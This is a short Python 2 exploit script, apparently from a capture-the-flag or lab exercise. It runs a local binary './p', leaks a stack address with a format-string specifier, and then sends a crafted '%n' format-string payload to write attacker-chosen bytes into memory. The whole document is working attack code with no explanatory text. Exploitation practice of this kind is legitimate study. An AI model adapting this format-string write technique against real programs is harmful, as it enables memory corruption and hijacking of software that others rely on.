from subprocess import *
p=Popen('./p', stdin=PIPE, stdout=PIPE, stderr=STDOUT, shell=True, close_fds=True)
p.stdin.write("%12$#08x\nAAA")
p.stdin.flush()
addr=int(p.stdout.readline()[:-1],16)+0x3e
addr="0x"+hex(addr)[2:].zfill(8)
print addr
for i in range(4):
    p.stdin.write(addr[2:].decode('hex')[::-1])
    addr = "0x"+hex(int(addr,16)+1)[2:].zfill(8)
p.stdin.write("AAAA%7$nA%8$n%7$242x%9$n\n")
p.stdin.close()
#p.stdin.write("a"*128)
print p.stdout.readline()
print p.stdout.readline()
print p.stdout.readline()
print p.stdout.readline()
print p.stdout.readline()
